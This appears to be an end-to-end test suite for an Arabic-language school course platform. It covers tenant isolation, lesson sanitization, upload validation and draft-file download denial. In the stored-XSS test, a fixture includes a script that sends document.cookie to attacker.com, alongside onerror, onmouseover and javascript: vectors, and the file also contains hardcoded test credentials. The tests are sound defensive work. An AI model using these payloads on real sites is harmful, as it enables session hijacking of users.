import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, ValidationPipe } from '@nestjs/common';
import { PrismaClient } from '@prisma/client';
// eslint-disable-next-line @typescript-eslint/no-require-imports
const request = require('supertest');
// eslint-disable-next-line @typescript-eslint/no-require-imports
const cookieParser = require('cookie-parser');
import { AppModule } from '../src/app.module';
import { RequestIdInterceptor } from '../src/common/interceptors/request-id.interceptor';
import { TransformResponseInterceptor } from '../src/common/interceptors/transform-response.interceptor';
import { AllExceptionsFilter } from '../src/common/filters/all-exceptions.filter';

describe('DARB Phase 3: Course Expansion, Worksheets & Rich Content E2E Tests', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  // Session cookies
  let teacherAhmedCookie: string[];
  let teacherLaylaCookie: string[];
  let studentTariqCookie: string[];

  // Test entities
  let tenant1Id: string;
  let tenant2Id: string;
  let p3CourseId: string;
  let p3Section1Id: string;
  let p3Section2Id: string;
  let p3Lesson1Id: string;
  let p3DraftFileId: string;

  beforeAll(async () => {
    prisma = new PrismaClient({
      datasources: {
        db: {
          url: 'postgresql://postgres:postgres@localhost:5432/darb_dev?schema=public',
        },
      },
    });
    await prisma.$connect();

    const alAndalus = await prisma.tenant.findUniqueOrThrow({
      where: { slug: 'al-andalus' },
    });
    tenant1Id = alAndalus.id;

    const alNoor = await prisma.tenant.findUniqueOrThrow({
      where: { slug: 'al-noor' },
    });
    tenant2Id = alNoor.id;

    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();
    app.use(cookieParser());
    app.setGlobalPrefix('api/v1');
    app.useGlobalInterceptors(new RequestIdInterceptor(), new TransformResponseInterceptor());
    app.useGlobalFilters(new AllExceptionsFilter());
    app.useGlobalPipes(
      new ValidationPipe({
        whitelist: true,
        forbidNonWhitelisted: true,
        transform: true,
      }),
    );

    await app.init();

    // Helper to login
    const login = async (username: string, password = 'Darap123456!') => {
      const res = await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .send({ username, password });
      expect(res.status).toBe(200);
      return res.headers['set-cookie'];
    };

    // 1. Authenticate Teacher Ahmed (Tenant 1)
    teacherAhmedCookie = await login('teacher.ahmed');

    // 2. Authenticate Teacher Layla (Tenant 2)
    teacherLaylaCookie = await login('teacher.layla');

    // 3. Authenticate Student Tariq
    studentTariqCookie = await login('student.tariq');
  });

  afterAll(async () => {
    if (app) await app.close();
    if (prisma) await prisma.$disconnect();
  });

  describe('1. Course Metadata & Grade Level (P3-001)', () => {
    it('Teacher Ahmed creates course with gradeLevel and sanitized fields', async () => {
      const res = await request(app.getHttpServer())
        .post('/api/v1/teacher/courses')
        .set('Cookie', teacherAhmedCookie)
        .send({
          title: 'الفيزياء المتقدمة - الصف الثاني الثانوي <script>alert("hack")</script>',
          description: 'مقرر تجريبي يتناول الميكانيكا الكلاسيكية والكهرباء',
          subject: 'الفيزياء',
          gradeLevel: 'الصف الثاني الثانوي',
        });

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.gradeLevel).toBe('الصف الثاني الثانوي');
      expect(res.body.data.title).not.toContain('<script>');
      expect(res.body.data.title).toContain('الفيزياء المتقدمة - الصف الثاني الثانوي');
      p3CourseId = res.body.data.id;
    });

    it('Teacher Ahmed updates course gradeLevel and title', async () => {
      const res = await request(app.getHttpServer())
        .patch(`/api/v1/teacher/courses/${p3CourseId}`)
        .set('Cookie', teacherAhmedCookie)
        .send({
          gradeLevel: 'الصف الثالث الثانوي',
        });

      expect(res.status).toBe(200);
      expect(res.body.data.gradeLevel).toBe('الصف الثالث الثانوي');
    });
  });

  describe('2. Section Management & Tenant Isolation (P3-002, P3-003)', () => {
    it('Teacher Ahmed creates Section 1 in his course', async () => {
      const res = await request(app.getHttpServer())
        .post(`/api/v1/teacher/courses/${p3CourseId}/sections`)
        .set('Cookie', teacherAhmedCookie)
        .send({
          title: 'الوحدة الأولى: الميكانيكا الكلاسيكية',
          description: 'قوانين نيوتن والحركة الدائرية',
        });

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.title).toBe('الوحدة الأولى: الميكانيكا الكلاسيكية');
      expect(res.body.data.orderIndex).toBe(0);
      p3Section1Id = res.body.data.id;
    });

    it('Teacher Ahmed creates Section 2 with automatic orderIndex', async () => {
      const res = await request(app.getHttpServer())
        .post(`/api/v1/teacher/courses/${p3CourseId}/sections`)
        .set('Cookie', teacherAhmedCookie)
        .send({
          title: 'الوحدة الثانية: الكهرومغناطيسية',
          description: 'المجال الكهربائي والمغناطيسي',
        });

      expect(res.status).toBe(201);
      expect(res.body.data.title).toBe('الوحدة الثانية: الكهرومغناطيسية');
      expect(res.body.data.orderIndex).toBe(1);
      p3Section2Id = res.body.data.id;
    });

    it('CROSS-TENANT ISOLATION: Teacher Layla in Tenant 2 cannot access Ahmed sections', async () => {
      const res = await request(app.getHttpServer())
        .get(`/api/v1/teacher/courses/${p3CourseId}/sections`)
        .set('Cookie', teacherLaylaCookie);

      // Must be 403 Forbidden or 404
      expect([403, 404]).toContain(res.status);
      expect(res.body.success).toBe(false);
    });

    it('CROSS-TENANT ISOLATION: Teacher Layla cannot update Ahmed section', async () => {
      const res = await request(app.getHttpServer())
        .patch(`/api/v1/teacher/sections/${p3Section1Id}`)
        .set('Cookie', teacherLaylaCookie)
        .send({
          title: 'محاولة اختراق تعديل العنوان',
        });

      expect([403, 404]).toContain(res.status);
    });

    it('Teacher Ahmed can reorder sections', async () => {
      const res = await request(app.getHttpServer())
        .post(`/api/v1/teacher/courses/${p3CourseId}/sections/reorder`)
        .set('Cookie', teacherAhmedCookie)
        .send({
          sectionIds: [p3Section2Id, p3Section1Id],
        });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data[0].id).toBe(p3Section2Id);
      expect(res.body.data[0].orderIndex).toBe(0);
      expect(res.body.data[1].id).toBe(p3Section1Id);
      expect(res.body.data[1].orderIndex).toBe(1);
    });
  });

  describe('3. Rich Content & Stored XSS Neutralization (P3-004)', () => {
    it('Sanitizes malicious script tags, onerror attributes, and javascript URLs in lessons', async () => {
      const maliciousPayload = `
# الدرس الأول: قوانين نيوتن
<script>window.location='https://attacker.com?steal='+document.cookie</script>
هذا نص الشرح الطبيعي باللغة العربية.
<img src="invalid.jpg" onerror="alert('xss')" />
يمكنك زيارة [الرابط الضار](javascript:void(document.title="Hacked")) للمزيد.
[رابط موثوق](https://khanacademy.org/physics)
      `.trim();

      const res = await request(app.getHttpServer())
        .post(`/api/v1/teacher/courses/${p3CourseId}/lessons`)
        .set('Cookie', teacherAhmedCookie)
        .send({
          title: 'قوانين الحركة <b onmouseover=alert(1)>نيوتن</b>',
          content: maliciousPayload,
          sectionId: p3Section2Id,
        });

      expect(res.status).toBe(201);
      const lesson = res.body.data;
      p3Lesson1Id = lesson.id;

      // Ensure XSS vectors are stripped
      expect(lesson.title).not.toContain('onmouseover');
      expect(lesson.content).not.toContain('<script>');
      expect(lesson.content).not.toContain('onerror=');
      expect(lesson.content).not.toContain('javascript:');

      // Ensure safe Arabic content and safe links are preserved
      expect(lesson.content).toContain('هذا نص الشرح الطبيعي باللغة العربية.');
      expect(lesson.content).toContain('https://khanacademy.org/physics');
      expect(lesson.sectionId).toBe(p3Section2Id);
    });

    it('Rejects assigning lesson to a section belonging to a different course or tenant', async () => {
      // Create random UUID for non-existent section
      const randomSectionId = '00000000-0000-0000-0000-000000000000';
      const res = await request(app.getHttpServer())
        .post(`/api/v1/teacher/courses/${p3CourseId}/lessons`)
        .set('Cookie', teacherAhmedCookie)
        .send({
          title: 'درس اختبار قسم خاطئ',
          sectionId: randomSectionId,
        });

      expect([400, 404]).toContain(res.status);
    });
  });

  describe('4. Hardened Storage Upload & Key Verification (P3-005)', () => {
    let uploadTicket: string;
    let legitStorageKey: string;

    it('Presigns lesson file upload successfully', async () => {
      const res = await request(app.getHttpServer())
        .post(`/api/v1/teacher/lessons/${p3Lesson1Id}/files/presign-upload`)
        .set('Cookie', teacherAhmedCookie)
        .send({
          fileName: 'newton-laws-worksheet.pdf',
          mimeType: 'application/pdf',
          byteSize: 1024 * 1024 * 2, // 2MB
        });

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.uploadUrl).toBeDefined();
      expect(res.body.data.storageKey).toMatch(
        new RegExp(`^tenants/${tenant1Id}/lessons/${p3Lesson1Id}/`),
      );
      uploadTicket = res.body.data.uploadTicket;
      legitStorageKey = res.body.data.storageKey;
    });

    it('REJECTS upload completion when storageKey prefix does not match lesson namespace', async () => {
      const res = await request(app.getHttpServer())
        .post(`/api/v1/teacher/lessons/${p3Lesson1Id}/files/complete-upload`)
        .set('Cookie', teacherAhmedCookie)
        .send({
          storageKey: `tenants/${tenant2Id}/lessons/another-lesson-id/stolen.pdf`,
          fileName: 'stolen.pdf',
          mimeType: 'application/pdf',
          byteSize: 1024,
          uploadTicket,
        });

      expect(res.status).toBe(400);
      expect(res.body.message).toContain('مسار تخزين الملف غير صالح');
    });

    it('REJECTS upload completion with forbidden MIME type or executable extension', async () => {
      const res = await request(app.getHttpServer())
        .post(`/api/v1/teacher/lessons/${p3Lesson1Id}/files/complete-upload`)
        .set('Cookie', teacherAhmedCookie)
        .send({
          storageKey: legitStorageKey,
          fileName: 'malware.exe',
          mimeType: 'application/x-msdownload',
          byteSize: 1024,
          uploadTicket,
        });

      expect(res.status).toBe(400);
    });

    it('Completes valid upload and attaches file to draft lesson', async () => {
      const res = await request(app.getHttpServer())
        .post(`/api/v1/teacher/lessons/${p3Lesson1Id}/files/complete-upload`)
        .set('Cookie', teacherAhmedCookie)
        .send({
          storageKey: legitStorageKey,
          fileName: 'newton-laws-worksheet.pdf',
          mimeType: 'application/pdf',
          byteSize: 1024 * 1024 * 2,
          uploadTicket,
        });

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.originalName).toBe('newton-laws-worksheet.pdf');
      p3DraftFileId = res.body.data.id;
    });
  });

  describe('5. Strict Download Denial on Unpublished Lessons (P3-006)', () => {
    beforeAll(async () => {
      // 1. Publish the course, but KEEP LESSON UNPUBLISHED (DRAFT)
      await request(app.getHttpServer())
        .post(`/api/v1/teacher/courses/${p3CourseId}/publish`)
        .set('Cookie', teacherAhmedCookie);

      // 2. Generate join code
      const codeRes = await request(app.getHttpServer())
        .post(`/api/v1/teacher/courses/${p3CourseId}/join-codes`)
        .set('Cookie', teacherAhmedCookie)
        .send({ expiresInDays: 7 });

      const rawCode = codeRes.body.data.rawCode;

      // 3. Student Tariq joins the published course
      const joinRes = await request(app.getHttpServer())
        .post('/api/v1/student/join-courses')
        .set('Cookie', studentTariqCookie)
        .send({ code: rawCode });

      expect(joinRes.status).toBe(200);
    });

    it('STRICT SECURITY: Student is enrolled in published course, but lesson is DRAFT -> Download MUST be denied', async () => {
      const res = await request(app.getHttpServer())
        .get(`/api/v1/student/files/${p3DraftFileId}/presign-download`)
        .set('Cookie', studentTariqCookie);

      // Must be 403 Forbidden!
      expect(res.status).toBe(403);
      expect(res.body.message).toContain(
        'غير مصرح لك بتحميل هذا الملف: الدرس المرتبط بالملف لم يتم نشره بعد',
      );
    });

    it('Teacher publishes lesson -> Student can now download the attached worksheet', async () => {
      // 1. Teacher publishes lesson
      const pubRes = await request(app.getHttpServer())
        .post(`/api/v1/teacher/lessons/${p3Lesson1Id}/publish`)
        .set('Cookie', teacherAhmedCookie);
      expect(pubRes.status).toBe(200);

      // 2. Student now tries to download
      const dlRes = await request(app.getHttpServer())
        .get(`/api/v1/student/files/${p3DraftFileId}/presign-download`)
        .set('Cookie', studentTariqCookie);

      expect(dlRes.status).toBe(200);
      expect(dlRes.body.success).toBe(true);
      expect(dlRes.body.data.downloadUrl).toBeDefined();
      expect(dlRes.body.data.fileName).toBe('newton-laws-worksheet.pdf');
    });
  });

  describe('6. Section Deletion Preserving Child Lessons (P3-007)', () => {
    it('Deleting Section 2 safely disassociates lesson1 (sets sectionId to null) without deleting the lesson', async () => {
      // Delete Section 2
      const delRes = await request(app.getHttpServer())
        .delete(`/api/v1/teacher/sections/${p3Section2Id}`)
        .set('Cookie', teacherAhmedCookie);

      expect(delRes.status).toBe(200);
      expect(delRes.body.success).toBe(true);

      // Verify course details via Teacher API: lesson still exists with sectionId = null
      const courseRes = await request(app.getHttpServer())
        .get(`/api/v1/teacher/courses/${p3CourseId}`)
        .set('Cookie', teacherAhmedCookie);

      expect(courseRes.status).toBe(200);
      const remainingSections = courseRes.body.data.sections;
      expect(remainingSections.some((s: any) => s.id === p3Section2Id)).toBe(false);

      const foundLesson = courseRes.body.data.lessons.find((l: any) => l.id === p3Lesson1Id);
      expect(foundLesson).toBeDefined();
      expect(foundLesson.sectionId).toBeNull();
    });
  });

  describe('7. Student Navigation & Progress Calculation (P3-008)', () => {
    it('Student fetches course lessons and marks completion', async () => {
      const lessonsRes = await request(app.getHttpServer())
        .get(`/api/v1/student/courses/${p3CourseId}/lessons`)
        .set('Cookie', studentTariqCookie);

      expect(lessonsRes.status).toBe(200);
      expect(lessonsRes.body.data.length).toBeGreaterThan(0);
      const lesson = lessonsRes.body.data[0];
      expect(lesson.isCompleted).toBe(false);

      // Mark completed
      const progRes = await request(app.getHttpServer())
        .post(`/api/v1/student/lessons/${lesson.id}/progress`)
        .set('Cookie', studentTariqCookie)
        .send({ isCompleted: true });

      expect(progRes.status).toBe(200);
      expect(progRes.body.data.isCompleted).toBe(true);
      expect(progRes.body.data.completedAt).toBeDefined();
    });
  });
});
